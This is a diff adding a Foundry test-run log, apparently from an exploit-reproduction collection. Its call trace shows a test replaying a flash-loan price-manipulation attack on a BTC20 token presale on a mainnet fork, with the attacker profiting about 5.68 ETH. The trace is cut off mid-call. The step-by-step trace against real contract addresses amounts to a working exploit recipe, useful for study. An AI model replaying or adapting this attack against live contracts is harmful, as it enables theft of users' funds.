@@ -1,0 +1,293 @@
+Compiling 28 files with Solc 0.8.25
+Solc 0.8.25 finished in 1.33s
+Compiler run successful with warnings:
+Warning (2519): This declaration shadows an existing declaration.
+   --> src/test/interface.sol:886:5:
+    |
+886 |     function WETH() external view returns (address);
+    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:1598:5:
+     |
+1598 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:1850:5:
+     |
+1850 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:2560:5:
+     |
+2560 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:3759:5:
+     |
+3759 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+  --> src/test/2023-08/BTC20_exp.sol:18:5:
+   |
+18 |     IWETH WETH = IWETH(payable(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)));
+   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+
+Ran 1 test for script/Exploit-template_new.sol:ExploitScript
+[PASS] testExploit() (gas: 20485)
+Logs:
+  Attacker ETH Balance Before exploit: 0.000000000000000000
+  Attacker ETH Balance After exploit: 0.000000000000000000
+
+Traces:
+  [20485] ExploitScript::testExploit()
+    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   └─ ← [Return] 
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 332.94ms (253.99µs CPU time)
+
+Ran 1 test for src/test/2023-08/BTC20_exp.sol:ContractTest
+[PASS] testExploit() (gas: 630660)
+Logs:
+  Before Start: 0 ETH
+  Attack Exploit: 5.684731200402649461 ETH
+
+Traces:
+  [712760] ContractTest::testExploit()
+    ├─ [2534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] console::log("Before Start: %d ETH", 0) [staticcall]
+    │   └─ ← [Stop] 
+    ├─ [690516] Balancer::flashLoan(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], [300000000000000000000 [3e20]], 0x)
+    │   ├─ [2534] WETH::balanceOf(Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]) [staticcall]
+    │   │   └─ ← [Return] 68806375619580487410091 [6.88e22]
+    │   ├─ [2350] 0xce88686553686DA562CE7Cea497CE749DA109f9F::getFlashLoanFeePercentage() [staticcall]
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   ├─ [25962] WETH::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 300000000000000000000 [3e20])
+    │   │   ├─ emit Transfer(from: Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 300000000000000000000 [3e20])
+    │   │   └─ ← [Return] true
+    │   ├─ [641207] ContractTest::receiveFlashLoan([0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], [300000000000000000000 [3e20]], [0], 0x)
+    │   │   ├─ [419634] SDEX_BTC20_Pair3::flash(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 76301042059171907852637 [7.63e22], 0x00000000000000000000000000000000000000000000102849abd491f931595d)
+    │   │   │   ├─ [2539] SDEX::balanceOf(SDEX_BTC20_Pair3: [0xDb81b8cfB2718f7289ae2365DE800ac2c787E385]) [staticcall]
+    │   │   │   │   └─ ← [Return] 1348723216560827653503193 [1.348e24]
+    │   │   │   ├─ [2930] BTC20::balanceOf(SDEX_BTC20_Pair3: [0xDb81b8cfB2718f7289ae2365DE800ac2c787E385]) [staticcall]
+    │   │   │   │   └─ ← [Return] 77071759655729199851149 [7.707e22]
+    │   │   │   ├─ [28627] BTC20::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 76301042059171907852637 [7.63e22])
+    │   │   │   │   ├─ emit Transfer(from: SDEX_BTC20_Pair3: [0xDb81b8cfB2718f7289ae2365DE800ac2c787E385], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 76301042059171907852637 [7.63e22])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [356840] ContractTest::uniswapV3FlashCallback(0, 763010420591719078527 [7.63e20], 0x00000000000000000000000000000000000000000000102849abd491f931595d)
+    │   │   │   │   ├─ [310565] BTC20_WETH_Pair3::flash(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 47676018750296374476872 [4.767e22], 0x000000000000000000000000000000000000000000000a1885abf70576458048)
+    │   │   │   │   │   ├─ [2534] WETH::balanceOf(BTC20_WETH_Pair3: [0x7234c91bd835a6Ed108c8e986E0663B14F9DE14e]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 2330602740225707965 [2.33e18]
+    │   │   │   │   │   ├─ [2930] BTC20::balanceOf(BTC20_WETH_Pair3: [0x7234c91bd835a6Ed108c8e986E0663B14F9DE14e]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 48157594697269065128154 [4.815e22]
+    │   │   │   │   │   ├─ [6727] BTC20::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 47676018750296374476872 [4.767e22])
+    │   │   │   │   │   │   ├─ emit Transfer(from: BTC20_WETH_Pair3: [0x7234c91bd835a6Ed108c8e986E0663B14F9DE14e], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 47676018750296374476872 [4.767e22])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [274681] ContractTest::uniswapV3FlashCallback(0, 476760187502963744769 [4.767e20], 0x000000000000000000000000000000000000000000000a1885abf70576458048)
+    │   │   │   │   │   │   ├─ [930] BTC20::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 123977060809468282329509 [1.239e23]
+    │   │   │   │   │   │   ├─ [70207] uniRouter::swapExactTokensForTokens(123977060809468282329509 [1.239e23], 0, [0xE86DF1970055e9CaEe93Dae9B7D5fD71595d0e18, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   │   │   │   ├─ [2504] BTC20_WETH_Pair2::getReserves() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 66567059340841615084 [6.656e19], 86892067656927565101331 [8.689e22], 1692452795 [1.692e9]
+    │   │   │   │   │   │   │   ├─ [16535] BTC20::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], BTC20_WETH_Pair2: [0xd50C5B8f04587D67298915E099E170af3Cd6909A], 123977060809468282329509 [1.239e23])
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: BTC20_WETH_Pair2: [0xd50C5B8f04587D67298915E099E170af3Cd6909A], value: 123977060809468282329509 [1.239e23])
+    │   │   │   │   │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: uniRouter: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], value: 115792089237316195423570985008687907853269984665640563915480523198444847310426 [1.157e77])
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   ├─ [40849] BTC20_WETH_Pair2::swap(39088548944505461782 [3.908e19], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   │   │   │   │   │   ├─ [8062] WETH::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 39088548944505461782 [3.908e19])
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: BTC20_WETH_Pair2: [0xd50C5B8f04587D67298915E099E170af3Cd6909A], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 39088548944505461782 [3.908e19])
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   ├─ [534] WETH::balanceOf(BTC20_WETH_Pair2: [0xd50C5B8f04587D67298915E099E170af3Cd6909A]) [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 27478510396336153302 [2.747e19]
+    │   │   │   │   │   │   │   │   ├─ [930] BTC20::balanceOf(BTC20_WETH_Pair2: [0xd50C5B8f04587D67298915E099E170af3Cd6909A]) [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 210869128466395847430840 [2.108e23]
+    │   │   │   │   │   │   │   │   ├─ emit Sync(reserve0: 27478510396336153302 [2.747e19], reserve1: 210869128466395847430840 [2.108e23])
+    │   │   │   │   │   │   │   │   ├─ emit Swap(sender: uniRouter: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], amount0In: 0, amount1In: 123977060809468282329509 [1.239e23], amount0Out: 39088548944505461782 [3.908e19], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   └─ ← [Return] [123977060809468282329509 [1.239e23], 39088548944505461782 [3.908e19]]
+    │   │   │   │   │   │   ├─ [9680] 0x1F006F43f57C45Ceb3659E543352b4FAe4662dF7::directTotalTokensSold() [staticcall]
+    │   │   │   │   │   │   │   ├─ [2364] 0xDb0618E0B850CAb3F756d030398bE22929226d5c::directTotalTokensSold() [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 37484 [3.748e4]
+    │   │   │   │   │   │   │   └─ ← [Return] 37484 [3.748e4]
+    │   │   │   │   │   │   ├─ [3246] 0x1F006F43f57C45Ceb3659E543352b4FAe4662dF7::maxTokensToSell() [staticcall]
+    │   │   │   │   │   │   │   ├─ [2430] 0xDb0618E0B850CAb3F756d030398bE22929226d5c::maxTokensToSell() [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 100000 [1e5]
+    │   │   │   │   │   │   │   └─ ← [Return] 100000 [1e5]
+    │   │   │   │   │   │   ├─ [81102] 0x1F006F43f57C45Ceb3659E543352b4FAe4662dF7::buyWithEthDynamic{value: 300000000000000000000}(62516 [6.251e4])
+    │   │   │   │   │   │   │   ├─ [80283] 0xDb0618E0B850CAb3F756d030398bE22929226d5c::buyWithEthDynamic{value: 300000000000000000000}(62516 [6.251e4]) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ [4122] uniRouter::getAmountsIn(62516000000000000000000 [6.251e22], [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0xE86DF1970055e9CaEe93Dae9B7D5fD71595d0e18]) [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [504] BTC20_WETH_Pair2::getReserves() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 27478510396336153302 [2.747e19], 210869128466395847430840 [2.108e23], 1692452879 [1.692e9]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] [11614285593821339252 [1.161e19], 62516000000000000000000 [6.251e22]]
+    │   │   │   │   │   │   │   │   ├─ [0] 0x58178A119781df139307572066D5E74704809861::fallback{value: 12194999873512406214}()
+    │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   ├─ [1444] ContractTest::receive{value: 287805000126487593786}()
+    │   │   │   │   │   │   │   │   │   ├─ emit Received(: 0x1F006F43f57C45Ceb3659E543352b4FAe4662dF7, : 287805000126487593786 [2.878e20])
+    │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   ├─ [28627] BTC20::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 62516000000000000000000 [6.251e22])
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x1F006F43f57C45Ceb3659E543352b4FAe4662dF7, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 62516000000000000000000 [6.251e22])
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   ├─  emit topic 0: 0x4d8aead3491b7eba4b5c7a65fc17e493b9e63f9e433522fc5f6a85a168fc9d36
+    │   │   │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   │   │   │        topic 2: 0x000000000000000000000000000000000000000000000000000000000000f434
+    │   │   │   │   │   │   │   │   │        topic 3: 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000000a93d57c5e8a3fcc600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000064e0c80f
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 339088548944505461782 [3.39e20]
+    │   │   │   │   │   │   ├─ [31184] uniRouter::swapTokensForExactTokens(48152778937799338221641 [4.815e22], 339088548944505461782 [3.39e20], [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0xE86DF1970055e9CaEe93Dae9B7D5fD71595d0e18], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   │   │   │   ├─ [504] BTC20_WETH_Pair2::getReserves() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 27478510396336153302 [2.747e19], 210869128466395847430840 [2.108e23], 1692452879 [1.692e9]
+    │   │   │   │   │   │   │   ├─ [5425] WETH::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], BTC20_WETH_Pair2: [0xd50C5B8f04587D67298915E099E170af3Cd6909A], 8156206089568455506 [8.156e18])
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: BTC20_WETH_Pair2: [0xd50C5B8f04587D67298915E099E170af3Cd6909A], value: 8156206089568455506 [8.156e18])
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   ├─ [17498] BTC20_WETH_Pair2::swap(0, 48152778937799338221641 [4.815e22], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   │   │   │   │   │   ├─ [3927] BTC20::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 48152778937799338221641 [4.815e22])
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: BTC20_WETH_Pair2: [0xd50C5B8f04587D67298915E099E170af3Cd6909A], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 48152778937799338221641 [4.815e22])
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   ├─ [534] WETH::balanceOf(BTC20_WETH_Pair2: [0xd50C5B8f04587D67298915E099E170af3Cd6909A]) [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 35634716485904608808 [3.563e19]
+    │   │   │   │   │   │   │   │   ├─ [930] BTC20::balanceOf(BTC20_WETH_Pair2: [0xd50C5B8f04587D67298915E099E170af3Cd6909A]) [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 162716349528596509209199 [1.627e23]
+    │   │   │   │   │   │   │   │   ├─ emit Sync(reserve0: 35634716485904608808 [3.563e19], reserve1: 162716349528596509209199 [1.627e23])
+    │   │   │   │   │   │   │   │   ├─ emit Swap(sender: uniRouter: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], amount0In: 8156206089568455506 [8.156e18], amount1In: 0, amount0Out: 0, amount1Out: 48152778937799338221641 [4.815e22], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   └─ ← [Return] [8156206089568455506 [8.156e18], 48152778937799338221641 [4.815e22]]
+    │   │   │   │   │   │   ├─ [3927] BTC20::transfer(BTC20_WETH_Pair3: [0x7234c91bd835a6Ed108c8e986E0663B14F9DE14e], 48152778937799338221641 [4.815e22])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: BTC20_WETH_Pair3: [0x7234c91bd835a6Ed108c8e986E0663B14F9DE14e], value: 48152778937799338221641 [4.815e22])
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [534] WETH::balanceOf(BTC20_WETH_Pair3: [0x7234c91bd835a6Ed108c8e986E0663B14F9DE14e]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 2330602740225707965 [2.33e18]
+    │   │   │   │   │   ├─ [930] BTC20::balanceOf(BTC20_WETH_Pair3: [0x7234c91bd835a6Ed108c8e986E0663B14F9DE14e]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 48634354884772028872923 [4.863e22]
+    │   │   │   │   │   ├─ emit Flash(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 0, param3: 47676018750296374476872 [4.767e22], param4: 0, param5: 476760187502963744769 [4.767e20])
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 330932342854937006276 [3.309e20]
+    │   │   │   │   ├─ [29184] uniRouter::swapTokensForExactTokens(77064052479763626931164 [7.706e22], 330932342854937006276 [3.309e20], [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0xE86DF1970055e9CaEe93Dae9B7D5fD71595d0e18], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   │   ├─ [504] BTC20_WETH_Pair2::getReserves() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 35634716485904608808 [3.563e19], 162716349528596509209199 [1.627e23], 1692452879 [1.692e9]
+    │   │   │   │   │   ├─ [3425] WETH::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], BTC20_WETH_Pair2: [0xd50C5B8f04587D67298915E099E170af3Cd6909A], 32158144183281539785 [3.215e19])
+    │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: BTC20_WETH_Pair2: [0xd50C5B8f04587D67298915E099E170af3Cd6909A], value: 32158144183281539785 [3.215e19])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [17498] BTC20_WETH_Pair2::swap(0, 77064052479763626931164 [7.706e22], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   │   │   │   ├─ [3927] BTC20::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 77064052479763626931164 [7.706e22])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: BTC20_WETH_Pair2: [0xd50C5B8f04587D67298915E099E170af3Cd6909A], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 77064052479763626931164 [7.706e22])
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [534] WETH::balanceOf(BTC20_WETH_Pair2: [0xd50C5B8f04587D67298915E099E170af3Cd6909A]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 67792860669186148593 [6.779e19]
+    │   │   │   │   │   │   ├─ [930] BTC20::balanceOf(BTC20_WETH_Pair2: [0xd50C5B8f04587D67298915E099E170af3Cd6909A]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 85652297048832882278035 [8.565e22]
+    │   │   │   │   │   │   ├─ emit Sync(reserve0: 67792860669186148593 [6.779e19], reserve1: 85652297048832882278035 [8.565e22])
+    │   │   │   │   │   │   ├─ emit Swap(sender: uniRouter: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], amount0In: 32158144183281539785 [3.215e19], amount1In: 0, amount0Out: 0, amount1Out: 77064052479763626931164 [7.706e22], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   └─ ← [Return] [32158144183281539785 [3.215e19], 77064052479763626931164 [7.706e22]]
+    │   │   │   │   ├─ [3927] BTC20::transfer(SDEX_BTC20_Pair3: [0xDb81b8cfB2718f7289ae2365DE800ac2c787E385], 77064052479763626931164 [7.706e22])
+    │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SDEX_BTC20_Pair3: [0xDb81b8cfB2718f7289ae2365DE800ac2c787E385], value: 77064052479763626931164 [7.706e22])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [539] SDEX::balanceOf(SDEX_BTC20_Pair3: [0xDb81b8cfB2718f7289ae2365DE800ac2c787E385]) [staticcall]
+    │   │   │   │   └─ ← [Return] 1348723216560827653503193 [1.348e24]
+    │   │   │   ├─ [930] BTC20::balanceOf(SDEX_BTC20_Pair3: [0xDb81b8cfB2718f7289ae2365DE800ac2c787E385]) [staticcall]
+    │   │   │   │   └─ ← [Return] 77834770076320918929676 [7.783e22]
+    │   │   │   ├─ emit Flash(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 0, param3: 76301042059171907852637 [7.63e22], param4: 0, param5: 763010420591719078527 [7.63e20])
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [930] BTC20::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 62516000000000000000000 [6.251e22]
+    │   │   ├─ [125602] 0xE592427A0AEce92De3Edee1F18E0157C05861564::exactInputSingle(ExactInputSingleParams({ tokenIn: 0xE86DF1970055e9CaEe93Dae9B7D5fD71595d0e18, tokenOut: 0x5DE8ab7E27f6E7A1fFf3E5B337584Aa43961BEeF, fee: 10000 [1e4], recipient: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, deadline: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77], amountIn: 62516000000000000000000 [6.251e22], amountOutMinimum: 0, sqrtPriceLimitX96: 0 }))
+    │   │   │   ├─ [120641] SDEX_BTC20_Pair3::swap(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], false, 62516000000000000000000 [6.251e22], 1461446703485210103287273052203988822378723970341 [1.461e48], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002be86df1970055e9caee93dae9b7d5fd71595d0e180027105de8ab7e27f6e7a1fff3e5b337584aa43961beef000000000000000000000000000000000000000000)
+    │   │   │   │   ├─ [27734] SDEX::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1270785781943626791086803 [1.27e24])
+    │   │   │   │   │   ├─ emit Transfer(from: SDEX_BTC20_Pair3: [0xDb81b8cfB2718f7289ae2365DE800ac2c787E385], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1270785781943626791086803 [1.27e24])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [930] BTC20::balanceOf(SDEX_BTC20_Pair3: [0xDb81b8cfB2718f7289ae2365DE800ac2c787E385]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 77834770076320918929676 [7.783e22]
+    │   │   │   │   ├─ [15821] 0xE592427A0AEce92De3Edee1F18E0157C05861564::uniswapV3SwapCallback(-1270785781943626791086803 [-1.27e24], 62516000000000000000000 [6.251e22], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002be86df1970055e9caee93dae9b7d5fd71595d0e180027105de8ab7e27f6e7a1fff3e5b337584aa43961beef000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [11735] BTC20::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SDEX_BTC20_Pair3: [0xDb81b8cfB2718f7289ae2365DE800ac2c787E385], 62516000000000000000000 [6.251e22])
+    │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SDEX_BTC20_Pair3: [0xDb81b8cfB2718f7289ae2365DE800ac2c787E385], value: 62516000000000000000000 [6.251e22])
+    │   │   │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xE592427A0AEce92De3Edee1F18E0157C05861564, value: 115792089237316195423570985008687907853269984665640563976941584007913129639935 [1.157e77])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [930] BTC20::balanceOf(SDEX_BTC20_Pair3: [0xDb81b8cfB2718f7289ae2365DE800ac2c787E385]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 140350770076320918929676 [1.403e23]
+    │   │   │   │   ├─ emit Swap(param0: 0xE592427A0AEce92De3Edee1F18E0157C05861564, param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: -1270785781943626791086803 [-1.27e24], param3: 62516000000000000000000 [6.251e22], param4: 1565614511106840333031549775525 [1.565e30], param5: 2598746457129766976968 [2.598e21], param6: 59677 [5.967e4])
+    │   │   │   │   └─ ← [Return] -1270785781943626791086803 [-1.27e24], 62516000000000000000000 [6.251e22]
+    │   │   │   └─ ← [Return] 1270785781943626791086803 [1.27e24]
+    │   │   ├─ [539] SDEX::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 1270785781943626791086803 [1.27e24]
+    │   │   ├─ [70147] 0xE592427A0AEce92De3Edee1F18E0157C05861564::exactInputSingle(ExactInputSingleParams({ tokenIn: 0x5DE8ab7E27f6E7A1fFf3E5B337584Aa43961BEeF, tokenOut: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, fee: 10000 [1e4], recipient: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, deadline: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77], amountIn: 1270785781943626791086803 [1.27e24], amountOutMinimum: 0, sqrtPriceLimitX96: 0 }))
